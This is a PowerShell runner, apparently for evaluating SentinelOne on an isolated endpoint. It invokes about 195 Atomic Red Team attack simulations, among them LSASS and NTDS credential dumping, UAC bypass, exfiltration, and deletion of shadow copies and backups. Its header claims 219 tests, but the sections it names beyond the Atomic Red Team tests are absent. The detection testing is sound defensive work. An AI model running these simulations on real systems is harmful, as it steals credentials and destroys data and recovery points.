# ============================================================
# SentinelOne POC — Full ART Windows Test Runner
# 219 tests: ART (196) + RanSim (8) + Manual LOLBAS (7) + Mimikatz (8)
# Run as Administrator on isolated test endpoint
# ============================================================

Set-ExecutionPolicy Bypass -Scope Process -Force
Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force -ErrorAction SilentlyContinue
Install-Module -Name powershell-yaml -Scope CurrentUser -Force -ErrorAction SilentlyContinue
Import-Module invoke-atomicredteam

$AtomicsPath = "C:\AtomicRedTeam\atomics"
if (-not (Test-Path $AtomicsPath)) {
    Install-AtomicRedTeam -getAtomics -InstallPath "C:\AtomicRedTeam"
}

$LogPath = "C:\s1_eval\art_results.csv"
New-Item -ItemType Directory -Force -Path "C:\s1_eval" | Out-Null
"TestID,Technique,TestName,StartTime,EndTime,DurationSec,Status" |
    Out-File -FilePath $LogPath -Encoding UTF8

function Run-Test {
    param(
        [string]$ID,
        [string]$Technique,
        [string]$TestName,
        [int]$TestNumber = 1,
        [int]$WaitSec = 30
    )
    Write-Host "`n[$ID] $Technique #$TestNumber — $TestName" -ForegroundColor Cyan
    Invoke-AtomicTest $Technique -TestNumbers $TestNumber -GetPrereqs 2>&1 | Out-Null
    $start = Get-Date
    try {
        Invoke-AtomicTest $Technique -TestNumbers $TestNumber -TimeoutSeconds 120
        $status = "Executed"
    } catch {
        $status = "Error: $_"
        Write-Host "  Error: $_" -ForegroundColor Red
    }
    $end = Get-Date
    $dur = [math]::Round(($end - $start).TotalSeconds, 1)
    "$ID,$Technique,`"$TestName`",$start,$end,$dur,$status" | Add-Content -Path $LogPath
    Write-Host "  Done in ${dur}s — check S1 console" -ForegroundColor Green
    Start-Sleep -Seconds $WaitSec
    Invoke-AtomicTest $Technique -TestNumbers $TestNumber -Cleanup 2>&1 | Out-Null
}


# ============================================================
# TACTIC: INITIAL-ACCESS (5 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " INITIAL-ACCESS" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1566.002 — Phishing: Spearphishing Link
Run-Test -ID "W-001" -Technique "T1566.002" -TestName "Paste and run technique" -TestNumber 1

# T1566.001 — Phishing: Spearphishing Attachment
Run-Test -ID "W-002" -Technique "T1566.001" -TestName "Download Macro-Enabled Phishing Attachment" -TestNumber 1
Run-Test -ID "W-003" -Technique "T1566.001" -TestName "Word spawned a command shell and used an IP address in the c" -TestNumber 2

# T1078.003 — Valid Accounts: Local Accounts
Run-Test -ID "W-004" -Technique "T1078.003" -TestName "Create local account with admin privileges" -TestNumber 1
Run-Test -ID "W-005" -Technique "T1078.003" -TestName "Use PsExec to elevate to NT Authority\SYSTEM account" -TestNumber 13

# ============================================================
# TACTIC: EXECUTION (31 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " EXECUTION" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1053.005 — Scheduled Task/Job: Scheduled Task
Run-Test -ID "W-006" -Technique "T1053.005" -TestName "Scheduled Task Startup Script" -TestNumber 1
Run-Test -ID "W-007" -Technique "T1053.005" -TestName "Scheduled task Local" -TestNumber 2
Run-Test -ID "W-008" -Technique "T1053.005" -TestName "Powershell Cmdlet Scheduled Task" -TestNumber 4
Run-Test -ID "W-009" -Technique "T1053.005" -TestName "Task Scheduler via VBA" -TestNumber 5

# T1047 — Windows Management Instrumentation
Run-Test -ID "W-010" -Technique "T1047" -TestName "WMI Reconnaissance Users" -TestNumber 1
Run-Test -ID "W-011" -Technique "T1047" -TestName "WMI Reconnaissance Processes" -TestNumber 2
Run-Test -ID "W-012" -Technique "T1047" -TestName "WMI Reconnaissance Software" -TestNumber 3

# T1574.011 — Hijack Execution Flow: Services Registry Permissions Weakness
Run-Test -ID "W-013" -Technique "T1574.011" -TestName "Service Registry Permissions Weakness" -TestNumber 1
Run-Test -ID "W-014" -Technique "T1574.011" -TestName "Service ImagePath Change with reg.exe" -TestNumber 2

# T1204.002 — User Execution: Malicious File
Run-Test -ID "W-015" -Technique "T1204.002" -TestName "OSTap Style Macro Execution" -TestNumber 1
Run-Test -ID "W-016" -Technique "T1204.002" -TestName "OSTap Payload Download" -TestNumber 2

# T1574.001 — Hijack Execution Flow: DLL
Run-Test -ID "W-017" -Technique "T1574.001" -TestName "DLL Search Order Hijacking - amsi.dll" -TestNumber 1
Run-Test -ID "W-018" -Technique "T1574.001" -TestName "Phantom Dll Hijacking - WinAppXRT.dll" -TestNumber 2
Run-Test -ID "W-019" -Technique "T1574.001" -TestName "DLL Side-Loading using the Notepad++ GUP.exe binary" -TestNumber 4

# T1059.001 — Command and Scripting Interpreter: PowerShell
Run-Test -ID "W-020" -Technique "T1059.001" -TestName "Mimikatz" -TestNumber 1
Run-Test -ID "W-021" -Technique "T1059.001" -TestName "Run BloodHound from local disk" -TestNumber 2
Run-Test -ID "W-022" -Technique "T1059.001" -TestName "Mimikatz - Cradlecraft PsSendKeys" -TestNumber 4
Run-Test -ID "W-023" -Technique "T1059.001" -TestName "PowerShell Session Creation and Use" -TestNumber 12
Run-Test -ID "W-024" -Technique "T1059.001" -TestName "ATHPowerShellCommandLineParameter -Command parameter variati" -TestNumber 13
Run-Test -ID "W-025" -Technique "T1059.001" -TestName "ATHPowerShellCommandLineParameter -Command parameter variati" -TestNumber 14
Run-Test -ID "W-026" -Technique "T1059.001" -TestName "PowerShell Command Execution" -TestNumber 17
Run-Test -ID "W-027" -Technique "T1059.001" -TestName "PowerShell Invoke Known Malicious Cmdlets" -TestNumber 18
Run-Test -ID "W-028" -Technique "T1059.001" -TestName "PowerUp Invoke-AllChecks" -TestNumber 19

# T1197 — BITS Jobs
Run-Test -ID "W-029" -Technique "T1197" -TestName "Bitsadmin Download (cmd)" -TestNumber 1
Run-Test -ID "W-030" -Technique "T1197" -TestName "Bitsadmin Download (PowerShell)" -TestNumber 2
Run-Test -ID "W-031" -Technique "T1197" -TestName "Persist, Download, and Execute" -TestNumber 3

# T1059.003 — Command and Scripting Interpreter: Windows Command Shell
Run-Test -ID "W-032" -Technique "T1059.003" -TestName "Create and Execute Batch Script" -TestNumber 1
Run-Test -ID "W-033" -Technique "T1059.003" -TestName "Writes text to a file and displays it." -TestNumber 2
Run-Test -ID "W-034" -Technique "T1059.003" -TestName "Suspicious Execution via Windows Command Shell" -TestNumber 3

# T1059.005 — Command and Scripting Interpreter: Visual Basic
Run-Test -ID "W-035" -Technique "T1059.005" -TestName "Visual Basic script execution to gather local computer infor" -TestNumber 1
Run-Test -ID "W-036" -Technique "T1059.005" -TestName "Encoded VBS code execution" -TestNumber 2

# ============================================================
# TACTIC: PERSISTENCE (17 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " PERSISTENCE" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1543.003 — Create or Modify System Process: Windows Service
Run-Test -ID "W-037" -Technique "T1543.003" -TestName "Modify Fax service to run PowerShell" -TestNumber 1
Run-Test -ID "W-038" -Technique "T1543.003" -TestName "Service Installation CMD" -TestNumber 2
Run-Test -ID "W-039" -Technique "T1543.003" -TestName "TinyTurla backdoor service w64time" -TestNumber 4

# T1547.005 — Boot or Logon Autostart Execution: Security Support Provider
Run-Test -ID "W-040" -Technique "T1547.005" -TestName "Modify HKLM:\System\CurrentControlSet\Control\Lsa Security S" -TestNumber 1

# T1112 — Modify Registry
Run-Test -ID "W-041" -Technique "T1112" -TestName "Modify Registry of Current User Profile - cmd" -TestNumber 1
Run-Test -ID "W-042" -Technique "T1112" -TestName "Modify Registry of Local Machine - cmd" -TestNumber 2
Run-Test -ID "W-043" -Technique "T1112" -TestName "Modify registry to store logon credentials" -TestNumber 3

# T1547.004 — Boot or Logon Autostart Execution: Winlogon Helper DLL
Run-Test -ID "W-044" -Technique "T1547.004" -TestName "Winlogon Shell Key Persistence - PowerShell" -TestNumber 1
Run-Test -ID "W-045" -Technique "T1547.004" -TestName "Winlogon Userinit Key Persistence - PowerShell" -TestNumber 2

# T1546.003 — Event Triggered Execution: Windows Management Instrumentation Event Subscription
Run-Test -ID "W-046" -Technique "T1546.003" -TestName "Persistence via WMI Event Subscription - CommandLineEventCon" -TestNumber 1

# T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Run-Test -ID "W-047" -Technique "T1547.001" -TestName "Reg Key Run" -TestNumber 1
Run-Test -ID "W-048" -Technique "T1547.001" -TestName "Reg Key RunOnce" -TestNumber 2
Run-Test -ID "W-049" -Technique "T1547.001" -TestName "Suspicious jse file run from startup Folder" -TestNumber 5

# T1098 — Account Manipulation
Run-Test -ID "W-050" -Technique "T1098" -TestName "Admin Account Manipulate" -TestNumber 1
Run-Test -ID "W-051" -Technique "T1098" -TestName "Domain Account and Group Manipulate" -TestNumber 2

# T1546.015 — Event Triggered Execution: Component Object Model Hijacking
Run-Test -ID "W-052" -Technique "T1546.015" -TestName "COM Hijacking - InprocServer32" -TestNumber 1

# T1546.007 — Event Triggered Execution: Netsh Helper DLL
Run-Test -ID "W-053" -Technique "T1546.007" -TestName "Netsh Helper DLL Registration" -TestNumber 1

# ============================================================
# TACTIC: PRIVILEGE-ESCALATION (17 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " PRIVILEGE-ESCALATION" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1055.011 — Process Injection: Extra Window Memory Injection
Run-Test -ID "W-054" -Technique "T1055.011" -TestName "Process Injection via Extra Window Memory (EWM) x64 executab" -TestNumber 1

# T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control
Run-Test -ID "W-055" -Technique "T1548.002" -TestName "Bypass UAC using Event Viewer (cmd)" -TestNumber 1
Run-Test -ID "W-056" -Technique "T1548.002" -TestName "Bypass UAC using Event Viewer (PowerShell)" -TestNumber 2
Run-Test -ID "W-057" -Technique "T1548.002" -TestName "Bypass UAC using Fodhelper" -TestNumber 3
Run-Test -ID "W-058" -Technique "T1548.002" -TestName "Bypass UAC using Fodhelper - PowerShell" -TestNumber 4

# T1055.003 — Thread Execution Hijacking
Run-Test -ID "W-059" -Technique "T1055.003" -TestName "Thread Execution Hijacking" -TestNumber 1

# T1055 — Process Injection
Run-Test -ID "W-060" -Technique "T1055" -TestName "Shellcode execution via VBA" -TestNumber 1
Run-Test -ID "W-061" -Technique "T1055" -TestName "Remote Process Injection in LSASS via mimikatz" -TestNumber 2
Run-Test -ID "W-062" -Technique "T1055" -TestName "Dirty Vanity process Injection" -TestNumber 4

# T1134.002 — Create Process with Token
Run-Test -ID "W-063" -Technique "T1134.002" -TestName "Access Token Manipulation" -TestNumber 1

# T1055.002 — Process Injection: Portable Executable Injection
Run-Test -ID "W-064" -Technique "T1055.002" -TestName "Portable Executable Injection" -TestNumber 1

# T1134.001 — Access Token Manipulation: Token Impersonation/Theft
Run-Test -ID "W-065" -Technique "T1134.001" -TestName "Named pipe client impersonation" -TestNumber 1

# T1055.012 — Process Injection: Process Hollowing
Run-Test -ID "W-066" -Technique "T1055.012" -TestName "Process Hollowing using PowerShell" -TestNumber 1
Run-Test -ID "W-067" -Technique "T1055.012" -TestName "RunPE via VBA" -TestNumber 2
Run-Test -ID "W-068" -Technique "T1055.012" -TestName "Process Hollowing in Go using CreateProcessW WinAPI" -TestNumber 3
Run-Test -ID "W-069" -Technique "T1055.012" -TestName "Process Hollowing in Go using CreateProcessW and CreatePipe " -TestNumber 4

# T1055.001 — Process Injection: Dynamic-link Library Injection
Run-Test -ID "W-070" -Technique "T1055.001" -TestName "Process Injection via mavinject.exe" -TestNumber 1

# ============================================================
# TACTIC: STEALTH (41 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " STEALTH" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1218.011 — Signed Binary Proxy Execution: Rundll32
Run-Test -ID "W-071" -Technique "T1218.011" -TestName "Rundll32 execute JavaScript Remote Payload With GetObject" -TestNumber 1
Run-Test -ID "W-072" -Technique "T1218.011" -TestName "Rundll32 execute VBscript command" -TestNumber 2
Run-Test -ID "W-073" -Technique "T1218.011" -TestName "Rundll32 advpack.dll Execution" -TestNumber 4
Run-Test -ID "W-074" -Technique "T1218.011" -TestName "Execution of HTA and VBS Files using Rundll32 and URL.dll" -TestNumber 8
Run-Test -ID "W-075" -Technique "T1218.011" -TestName "Launches an executable using Rundll32 and pcwutl.dll" -TestNumber 9
Run-Test -ID "W-076" -Technique "T1218.011" -TestName "Execution of non-dll using rundll32.exe" -TestNumber 10
Run-Test -ID "W-077" -Technique "T1218.011" -TestName "Rundll32 with Control_RunDLL" -TestNumber 12

# T1216.001 — Signed Script Proxy Execution: Pubprn
Run-Test -ID "W-078" -Technique "T1216.001" -TestName "PubPrn.vbs Signed Script Bypass" -TestNumber 1

# T1006 — Direct Volume Access
Run-Test -ID "W-079" -Technique "T1006" -TestName "Read volume boot sector via DOS device path (PowerShell)" -TestNumber 1

# T1036.007 — Masquerading: Double File Extension
Run-Test -ID "W-080" -Technique "T1036.007" -TestName "File Extension Masquerading" -TestNumber 1

# T1036.005 — Masquerading: Match Legitimate Name or Location
Run-Test -ID "W-081" -Technique "T1036.005" -TestName "Masquerade as a built-in system executable" -TestNumber 2
Run-Test -ID "W-082" -Technique "T1036.005" -TestName "Masquerading cmd.exe as VEDetector.exe" -TestNumber 3

# T1564 — Hide Artifacts
Run-Test -ID "W-083" -Technique "T1564" -TestName "Create a Hidden User Called '$'" -TestNumber 2
Run-Test -ID "W-084" -Technique "T1564" -TestName "Create an 'Administrator ' user (with a space on the end)" -TestNumber 3
Run-Test -ID "W-085" -Technique "T1564" -TestName "Create and Hide a Service with sc.exe" -TestNumber 4

# T1497.001 — Virtualization/Sandbox Evasion: System Checks
Run-Test -ID "W-086" -Technique "T1497.001" -TestName "Detect Virtualization Environment (Windows)" -TestNumber 3
Run-Test -ID "W-087" -Technique "T1497.001" -TestName "Detect Virtualization Environment via WMI Manufacturer/Model" -TestNumber 5

# T1218.004 — Signed Binary Proxy Execution: InstallUtil
Run-Test -ID "W-088" -Technique "T1218.004" -TestName "CheckIfInstallable method call" -TestNumber 1
Run-Test -ID "W-089" -Technique "T1218.004" -TestName "InstallUtil Install method call" -TestNumber 4
Run-Test -ID "W-090" -Technique "T1218.004" -TestName "InstallUtil Uninstall method call - '/installtype=notransact" -TestNumber 6
Run-Test -ID "W-091" -Technique "T1218.004" -TestName "InstallUtil evasive invocation" -TestNumber 8

# T1218.007 — Signed Binary Proxy Execution: Msiexec
Run-Test -ID "W-092" -Technique "T1218.007" -TestName "Msiexec.exe - Execute Local MSI file with embedded JScript" -TestNumber 1
Run-Test -ID "W-093" -Technique "T1218.007" -TestName "Msiexec.exe - Execute Local MSI file with an embedded DLL" -TestNumber 3
Run-Test -ID "W-094" -Technique "T1218.007" -TestName "Msiexec.exe - Execute Local MSI file with an embedded EXE" -TestNumber 4
Run-Test -ID "W-095" -Technique "T1218.007" -TestName "Msiexec.exe - Execute Remote MSI file" -TestNumber 11

# T1070.003 — Indicator Removal on Host: Clear Command History
Run-Test -ID "W-096" -Technique "T1070.003" -TestName "Prevent Powershell History Logging" -TestNumber 11
Run-Test -ID "W-097" -Technique "T1070.003" -TestName "Clear Powershell History by Deleting History File" -TestNumber 12
Run-Test -ID "W-098" -Technique "T1070.003" -TestName "Clear PowerShell Session History" -TestNumber 14

# T1202 — Indirect Command Execution
Run-Test -ID "W-099" -Technique "T1202" -TestName "Indirect Command Execution - pcalua.exe" -TestNumber 1
Run-Test -ID "W-100" -Technique "T1202" -TestName "Indirect Command Execution - forfiles.exe" -TestNumber 2
Run-Test -ID "W-101" -Technique "T1202" -TestName "Indirect Command Execution - conhost.exe" -TestNumber 3

# T1140 — Deobfuscate/Decode Files or Information
Run-Test -ID "W-102" -Technique "T1140" -TestName "Deobfuscate/Decode Files Or Information" -TestNumber 1
Run-Test -ID "W-103" -Technique "T1140" -TestName "Certutil Rename and Decode" -TestNumber 2

# T1218.003 — Signed Binary Proxy Execution: CMSTP
Run-Test -ID "W-104" -Technique "T1218.003" -TestName "CMSTP Executing Remote Scriptlet" -TestNumber 1

# T1218.005 — Signed Binary Proxy Execution: Mshta
Run-Test -ID "W-105" -Technique "T1218.005" -TestName "Mshta executes JavaScript Scheme Fetch Remote Payload With G" -TestNumber 1
Run-Test -ID "W-106" -Technique "T1218.005" -TestName "Mshta executes VBScript to execute malicious command" -TestNumber 2
Run-Test -ID "W-107" -Technique "T1218.005" -TestName "Mshta Executes Remote HTML Application (HTA)" -TestNumber 3

# T1027 — Obfuscated Files or Information
Run-Test -ID "W-108" -Technique "T1027" -TestName "Execute base64-encoded PowerShell" -TestNumber 2
Run-Test -ID "W-109" -Technique "T1027" -TestName "DLP Evasion via Sensitive Data in VBA Macro over email" -TestNumber 5

# T1218.010 — Signed Binary Proxy Execution: Regsvr32
Run-Test -ID "W-110" -Technique "T1218.010" -TestName "Regsvr32 local COM scriptlet execution" -TestNumber 1
Run-Test -ID "W-111" -Technique "T1218.010" -TestName "Regsvr32 remote COM scriptlet execution" -TestNumber 2

# ============================================================
# TACTIC: CREDENTIAL-ACCESS (20 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " CREDENTIAL-ACCESS" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1056.001 — Input Capture: Keylogging
Run-Test -ID "W-112" -Technique "T1056.001" -TestName "Input Capture" -TestNumber 1

# T1110.001 — Brute Force: Password Guessing
Run-Test -ID "W-113" -Technique "T1110.001" -TestName "Brute Force Credentials of single Active Directory domain us" -TestNumber 1
Run-Test -ID "W-114" -Technique "T1110.001" -TestName "Brute Force Credentials of single Active Directory domain us" -TestNumber 2

# T1003.002 — OS Credential Dumping: Security Account Manager
Run-Test -ID "W-115" -Technique "T1003.002" -TestName "Registry dump of SAM, creds, and secrets" -TestNumber 1
Run-Test -ID "W-116" -Technique "T1003.002" -TestName "Registry parse with pypykatz" -TestNumber 2

# T1003.004 — OS Credential Dumping: LSA Secrets
Run-Test -ID "W-117" -Technique "T1003.004" -TestName "Dumping LSA Secrets" -TestNumber 1

# T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting
Run-Test -ID "W-118" -Technique "T1558.004" -TestName "Rubeus asreproast" -TestNumber 1

# T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
Run-Test -ID "W-119" -Technique "T1555.003" -TestName "Run Chrome-password Collector" -TestNumber 1

# T1003.001 — OS Credential Dumping: LSASS Memory
Run-Test -ID "W-120" -Technique "T1003.001" -TestName "Dump LSASS.exe Memory using ProcDump" -TestNumber 1
Run-Test -ID "W-121" -Technique "T1003.001" -TestName "Dump LSASS.exe Memory using direct system calls and API unho" -TestNumber 3
Run-Test -ID "W-122" -Technique "T1003.001" -TestName "LSASS read with pypykatz" -TestNumber 7
Run-Test -ID "W-123" -Technique "T1003.001" -TestName "Create Mini Dump of LSASS.exe using ProcDump" -TestNumber 9

# T1110.003 — Brute Force: Password Spraying
Run-Test -ID "W-124" -Technique "T1110.003" -TestName "Password Spray all Domain Users" -TestNumber 1
Run-Test -ID "W-125" -Technique "T1110.003" -TestName "Password Spray (DomainPasswordSpray)" -TestNumber 2

# T1003.003 — OS Credential Dumping: NTDS
Run-Test -ID "W-126" -Technique "T1003.003" -TestName "Create Volume Shadow Copy with vssadmin" -TestNumber 1
Run-Test -ID "W-127" -Technique "T1003.003" -TestName "Copy NTDS.dit from Volume Shadow Copy" -TestNumber 2
Run-Test -ID "W-128" -Technique "T1003.003" -TestName "Dump Active Directory Database with NTDSUtil" -TestNumber 3

# T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
Run-Test -ID "W-129" -Technique "T1558.003" -TestName "Request for service tickets" -TestNumber 1
Run-Test -ID "W-130" -Technique "T1558.003" -TestName "Rubeus kerberoast" -TestNumber 2

# T1003.006 — OS Credential Dumping: DCSync
Run-Test -ID "W-131" -Technique "T1003.006" -TestName "DCSync (Active Directory)" -TestNumber 1

# ============================================================
# TACTIC: DISCOVERY (19 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " DISCOVERY" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1033 — System Owner/User Discovery
Run-Test -ID "W-132" -Technique "T1033" -TestName "System Owner/User Discovery" -TestNumber 1
Run-Test -ID "W-133" -Technique "T1033" -TestName "User Discovery With Env Vars PowerShell Script" -TestNumber 4

# T1087.002 — Account Discovery: Domain Account
Run-Test -ID "W-134" -Technique "T1087.002" -TestName "Enumerate all accounts (Domain)" -TestNumber 1
Run-Test -ID "W-135" -Technique "T1087.002" -TestName "Enumerate logged on users via CMD (Domain)" -TestNumber 3

# T1069.002 — Permission Groups Discovery: Domain Groups
Run-Test -ID "W-136" -Technique "T1069.002" -TestName "Basic Permission Groups Discovery Windows (Domain)" -TestNumber 1
Run-Test -ID "W-137" -Technique "T1069.002" -TestName "Permission Groups Discovery PowerShell (Domain)" -TestNumber 2

# T1007 — System Service Discovery
Run-Test -ID "W-138" -Technique "T1007" -TestName "System Service Discovery" -TestNumber 1

# T1082 — System Information Discovery
Run-Test -ID "W-139" -Technique "T1082" -TestName "System Information Discovery" -TestNumber 1

# T1016 — System Network Configuration Discovery
Run-Test -ID "W-140" -Technique "T1016" -TestName "System Network Configuration Discovery on Windows" -TestNumber 1
Run-Test -ID "W-141" -Technique "T1016" -TestName "List Windows Firewall Rules" -TestNumber 2

# T1083 — File and Directory Discovery
Run-Test -ID "W-142" -Technique "T1083" -TestName "File and Directory Discovery (cmd.exe)" -TestNumber 1

# T1049 — System Network Connections Discovery
Run-Test -ID "W-143" -Technique "T1049" -TestName "System Network Connections Discovery" -TestNumber 1

# T1057 — Process Discovery
Run-Test -ID "W-144" -Technique "T1057" -TestName "Process Discovery - tasklist" -TestNumber 2

# T1069.001 — Permission Groups Discovery: Local Groups
Run-Test -ID "W-145" -Technique "T1069.001" -TestName "Basic Permission Groups Discovery Windows (Local)" -TestNumber 2

# T1012 — Query Registry
Run-Test -ID "W-146" -Technique "T1012" -TestName "Query Registry" -TestNumber 1
Run-Test -ID "W-147" -Technique "T1012" -TestName "Query Registry with Powershell cmdlets" -TestNumber 2

# T1018 — Remote System Discovery
Run-Test -ID "W-148" -Technique "T1018" -TestName "Remote System Discovery - net" -TestNumber 1
Run-Test -ID "W-149" -Technique "T1018" -TestName "Remote System Discovery - net group Domain Computers" -TestNumber 2
Run-Test -ID "W-150" -Technique "T1018" -TestName "Remote System Discovery - nltest" -TestNumber 3

# ============================================================
# TACTIC: LATERAL-MOVEMENT (9 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " LATERAL-MOVEMENT" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1021.002 — Remote Services: SMB/Windows Admin Shares
Run-Test -ID "W-151" -Technique "T1021.002" -TestName "Map admin share" -TestNumber 1
Run-Test -ID "W-152" -Technique "T1021.002" -TestName "Map Admin Share PowerShell" -TestNumber 2
Run-Test -ID "W-153" -Technique "T1021.002" -TestName "Copy and Execute File with PsExec" -TestNumber 3

# T1021.006 — Remote Services: Windows Remote Management
Run-Test -ID "W-154" -Technique "T1021.006" -TestName "Enable Windows Remote Management" -TestNumber 1
Run-Test -ID "W-155" -Technique "T1021.006" -TestName "Remote Code Execution with PS Credentials Using Invoke-Comma" -TestNumber 2

# T1570 — Lateral Tool Transfer
Run-Test -ID "W-156" -Technique "T1570" -TestName "Exfiltration Over SMB over QUIC (New-SmbMapping)" -TestNumber 1

# T1563.002 — Remote Service Session Hijacking: RDP Hijacking
Run-Test -ID "W-157" -Technique "T1563.002" -TestName "RDP hijacking" -TestNumber 1

# T1550.002 — Use Alternate Authentication Material: Pass the Hash
Run-Test -ID "W-158" -Technique "T1550.002" -TestName "Mimikatz Pass the Hash" -TestNumber 1

# T1021.001 — Remote Services: Remote Desktop Protocol
Run-Test -ID "W-159" -Technique "T1021.001" -TestName "RDP to DomainController" -TestNumber 1

# ============================================================
# TACTIC: COMMAND-AND-CONTROL (7 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " COMMAND-AND-CONTROL" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1132.001 — Data Encoding: Standard Encoding
Run-Test -ID "W-160" -Technique "T1132.001" -TestName "XOR Encoded data." -TestNumber 3

# T1071.004 — Application Layer Protocol: DNS
Run-Test -ID "W-161" -Technique "T1071.004" -TestName "DNS Large Query Volume" -TestNumber 1
Run-Test -ID "W-162" -Technique "T1071.004" -TestName "DNS Regular Beaconing" -TestNumber 2
Run-Test -ID "W-163" -Technique "T1071.004" -TestName "DNS Long Domain Query" -TestNumber 3

# T1095 — Non-Application Layer Protocol
Run-Test -ID "W-164" -Technique "T1095" -TestName "ICMP C2" -TestNumber 1

# T1071.001 — Application Layer Protocol: Web Protocols
Run-Test -ID "W-165" -Technique "T1071.001" -TestName "Malicious User Agents - Powershell" -TestNumber 1
Run-Test -ID "W-166" -Technique "T1071.001" -TestName "Malicious User Agents - CMD" -TestNumber 2

# ============================================================
# TACTIC: COLLECTION (6 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " COLLECTION" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1560.001 — Archive Collected Data: Archive via Utility
Run-Test -ID "W-167" -Technique "T1560.001" -TestName "Compress Data for Exfiltration With Rar" -TestNumber 1
Run-Test -ID "W-168" -Technique "T1560.001" -TestName "Compress Data and lock with password for Exfiltration with w" -TestNumber 2
Run-Test -ID "W-169" -Technique "T1560.001" -TestName "Compress Data and lock with password for Exfiltration with w" -TestNumber 3

# T1114.001 — Email Collection: Local Email Collection
Run-Test -ID "W-170" -Technique "T1114.001" -TestName "Email Collection with PowerShell Get-Inbox" -TestNumber 1

# T1005 — Data from Local System
Run-Test -ID "W-171" -Technique "T1005" -TestName "Search files of interest and save them to a single zip file " -TestNumber 1

# T1039 — Data from Network Shared Drive
Run-Test -ID "W-172" -Technique "T1039" -TestName "Copy a sensitive File over Administrative share with copy" -TestNumber 1

# ============================================================
# TACTIC: EXFILTRATION (9 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " EXFILTRATION" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1020 — Automated Exfiltration
Run-Test -ID "W-173" -Technique "T1020" -TestName "IcedID Botnet HTTP PUT" -TestNumber 1
Run-Test -ID "W-174" -Technique "T1020" -TestName "Exfiltration via Encrypted FTP" -TestNumber 2

# T1048.002 — Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
Run-Test -ID "W-175" -Technique "T1048.002" -TestName "Exfiltrate data HTTPS using curl windows" -TestNumber 1

# T1041 — Exfiltration Over C2 Channel
Run-Test -ID "W-176" -Technique "T1041" -TestName "C2 Data Exfiltration" -TestNumber 1
Run-Test -ID "W-177" -Technique "T1041" -TestName "Text Based Data Exfiltration using DNS subdomains" -TestNumber 2

# T1048 — Exfiltration Over Alternative Protocol
Run-Test -ID "W-178" -Technique "T1048" -TestName "DNSExfiltration (doh)" -TestNumber 3

# T1048.003 — Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
Run-Test -ID "W-179" -Technique "T1048.003" -TestName "Exfiltration Over Alternative Protocol - ICMP" -TestNumber 2
Run-Test -ID "W-180" -Technique "T1048.003" -TestName "Exfiltration Over Alternative Protocol - HTTP" -TestNumber 4
Run-Test -ID "W-181" -Technique "T1048.003" -TestName "Exfiltration Over Alternative Protocol - SMTP" -TestNumber 5

# ============================================================
# TACTIC: IMPACT (15 tests)
# ============================================================
Write-Host "`n==================================================" -ForegroundColor Magenta
Write-Host " IMPACT" -ForegroundColor Magenta
Write-Host "==================================================" -ForegroundColor Magenta

# T1489 — Service Stop
Run-Test -ID "W-182" -Technique "T1489" -TestName "Windows - Stop service using Service Controller" -TestNumber 1
Run-Test -ID "W-183" -Technique "T1489" -TestName "Windows - Stop service using net.exe" -TestNumber 2
Run-Test -ID "W-184" -Technique "T1489" -TestName "Windows - Stop service by killing process" -TestNumber 3

# T1531 — Account Access Removal
Run-Test -ID "W-185" -Technique "T1531" -TestName "Change User Password - Windows" -TestNumber 1

# T1485 — Data Destruction
Run-Test -ID "W-186" -Technique "T1485" -TestName "Windows - Overwrite file with SysInternals SDelete" -TestNumber 1
Run-Test -ID "W-187" -Technique "T1485" -TestName "Overwrite deleted data on C drive" -TestNumber 3

# T1490 — Inhibit System Recovery
Run-Test -ID "W-188" -Technique "T1490" -TestName "Windows - Delete Volume Shadow Copies" -TestNumber 1
Run-Test -ID "W-189" -Technique "T1490" -TestName "Windows - Delete Volume Shadow Copies via WMI" -TestNumber 2
Run-Test -ID "W-190" -Technique "T1490" -TestName "Windows - wbadmin Delete Windows Backup Catalog" -TestNumber 3
Run-Test -ID "W-191" -Technique "T1490" -TestName "Windows - Disable Windows Recovery Console Repair" -TestNumber 4
Run-Test -ID "W-192" -Technique "T1490" -TestName "Windows - Delete Volume Shadow Copies via WMI with PowerShel" -TestNumber 5
Run-Test -ID "W-193" -Technique "T1490" -TestName "Windows - Delete Backup Files" -TestNumber 6
Run-Test -ID "W-194" -Technique "T1490" -TestName "Windows - wbadmin Delete systemstatebackup" -TestNumber 7
Run-Test -ID "W-195" -Technique "T1490" -TestName "Disable System Restore Through Registry" -TestNumber 9
